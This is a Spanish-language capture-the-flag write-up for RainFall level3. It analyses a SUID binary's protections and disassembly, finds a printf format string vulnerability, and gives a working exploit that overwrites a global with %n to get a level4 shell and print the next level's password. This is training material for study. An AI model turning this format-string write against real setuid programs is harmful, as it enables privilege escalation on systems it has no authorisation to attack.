# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level0' y sus permisos. 

```
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level4`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```
level3@RainFall:~$ file ./level3 
./level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

### b). ASLR:
```
level3@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```
level3@RainFall:~$ readelf -l ./level3 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```
level3@RainFall:~$ nm ./level3 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```
level3@RainFall:~$ readelf -S ./level3 | grep -E ".got|.plt"
  [10] .rel.plt          REL             08048314 000314 000030 08   A  5  12  4
  [12] .plt              PROGBITS        08048380 000380 000070 04  AX  0   0 16
  [22] .got              PROGBITS        08049814 000814 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049818 000818 000024 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

Probamos diferentes maneras de ejecutar el binario hasta lograr romperlo:

```
level3@RainFall:~$ (printf 'A%.0s' {1..58500000};) | ./level3 

a

a

a-bash: xmalloc: ../bash/braces.c:627: cannot allocate 9 bytes (2947088384 bytes allocated)
level3@RainFall:~$ 
level3@RainFall:~$ a

a: command not found
level3@RainFall:~$ 
level3@RainFall:~$ a
a: command not found
level3@RainFall:~$ 
level3@RainFall:~$ a
a: command not found
level3@RainFall:~$ 
level3@RainFall:~$ ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA01234567891011121314151617181920
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlevel3@RainFall:~$

level3@RainFall:~$ (printf 'A%.0s' {1..511}; printf '\n'; $(whoami); cat) | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlevel3: command not found
whoami
level3@RainFall:~$

level3@RainFall:~$ (printf 'A%.0s' {1..520}; printf '64'; cat) | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level3@RainFall:~$ (printf 'A%.0s' {1..5}; printf '64'; cat) | ./level3 
64
AAAAA6464
whoami
level3@RainFall:~$ 

```

* El binario `level3` mantiene abierta una shell y copia la cadena de caracteres usando la función `fgets()` que tiene límite de lectura. Por lo tanto no podemos romper el buffer por tamaño (buffer overflow). 

# 5. Reverse Engineering (Target Identification):

```
DDump of assembler code for function main:
  0x0804851a <+0>:	push   ebp
  0x0804851b <+1>:	mov    ebp,esp
  0x0804851d <+3>:	and    esp,0xfffffff0
  0x08048520 <+6>:	call   0x80484a4 <v>
  0x08048525 <+11>  leave  
  0x08048526 <+12>: ret    
End of assembler dump.
Dump of assembler code for function v:
  0x080484a4 <+0>:	   push   ebp
  0x080484a5 <+1>:	   mov    ebp,esp
  0x080484a7 <+3>:	   sub    esp,0x218                     // -> 538 bytes (0x218) 
  0x080484ad <+9>:	   mov    eax,ds:0x8049860
  0x080484b2 <+14>:	   mov    DWORD PTR [esp+0x8],eax
  0x080484b6 <+18>:	   mov    DWORD PTR [esp+0x4],0x200
  0x080484be <+26>:	   lea    eax,[ebp-0x208]
  0x080484c4 <+32>:	   mov    DWORD PTR [esp],eax
  0x080484c7 <+35>:	   call   0x80483a0 <fgets@plt>
  0x080484cc <+40>:	   lea    eax,[ebp-0x208]
  0x080484d2 <+46>:	   mov    DWORD PTR [esp],eax
  0x080484d5 <+49>:	   call   0x8048390 <printf@plt>
  0x080484da <+54>:	   mov    eax,ds:0x804988c
  0x080484df <+59>:	   cmp    eax,0x40
  0x080484e2 <+62>:	   jne    0x8048518 <v+116>
  0x080484e4 <+64>:	   mov    eax,ds:0x8049880
  0x080484e9 <+69>:	   mov    edx,eax
  0x080484eb <+71>:	   mov    eax,0x8048600
  0x080484f0 <+76>:	   mov    DWORD PTR [esp+0xc],edx
  0x080484f4 <+80>:	   mov    DWORD PTR [esp+0x8],0xc
  0x080484fc <+88>:	   mov    DWORD PTR [esp+0x4],0x1
  0x08048504 <+96>:	   mov    DWORD PTR [esp],eax
  0x08048507 <+99>:	   call   0x80483b0 <fwrite@plt>
  0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
  0x08048513 <+111>:	call   0x80483c0 <system@plt>
  0x08048518 <+116>:	leave  
  0x08048519 <+117>:	ret    
End of assembler dump.

```

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level3/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level3/source.c).

# 6. Solución:

1. Tras analizar el desensamblado en el punto anterior, vemos que solo podemos atacar el binairo desde dentro de la función `v`.
```asm
0x08048520 <+6>:	call   0x80484a4 <v>  ⟸
0x08048525 <+11>  leave   
```

2. **Identificamos el BACKDOOR**
```asm
0x080484d2 <+46>:	   mov    DWORD PTR [esp],eax           ⟸
0x080484d5 <+49>:	   call   0x8048390 <printf@plt>
```

* línea <+49>: call 0x8048390 <printf@plt>.
* Justo antes, en <+46>, se mueve la dirección del buffer (eax) directamente al tope del stack como primer argumento de printf.

3. **Vulnerabilidad detectada:**
* Se está llamando a `printf(buffer)` en lugar de `printf("%s", buffer)`.
* Esto se conoce como **Format String Vulnerability**. ESto confirma que no podemos "romper" el buffer por tamaño **(buffer overflow)**, sino explotarlo cómo `printf` interpreta los datos.

```asm
0x080484da <+54>:    mov    eax,ds:0x804988c      ⟸
0x080484df <+59>:    cmp    eax,0x40
0x080484e2 <+62>:    jne    0x8048518 <v+116>
```

4. **Objetivo:** 

```
level3@RainFall:~$ echo "AAAAA %p %p %p %p %p" | ./level3
AAAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x70252041

level3@RainFall:~$ (printf "\x8c\x98\x04\x08"; printf "%%60d%%4\$n"; cat) | ./level3 

�                                                         512
Wait what?!
whoami
level4
cd ..
cd level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
^C
level3@RainFall:~$ 
```

